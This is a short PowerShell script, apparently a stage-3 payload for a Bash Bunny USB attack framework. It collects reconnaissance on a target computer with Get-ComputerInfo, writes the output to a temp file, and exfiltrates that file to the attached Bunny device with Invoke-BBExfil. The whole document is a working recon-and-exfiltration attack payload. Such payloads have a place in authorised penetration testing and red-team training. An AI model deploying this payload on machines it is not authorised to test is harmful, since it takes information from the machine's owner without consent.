# Stage 3 payload for a recon example payload of the Bashbunny Powershell Framework
#
# Uses builtin powershell functionality to capture recon info about the target to a temporary file and exfiltrate that to the Bunny
Get-ComputerInfo > $env:TEMP\temp.txt
Invoke-BBExfil "$env:TEMP\temp.txt"
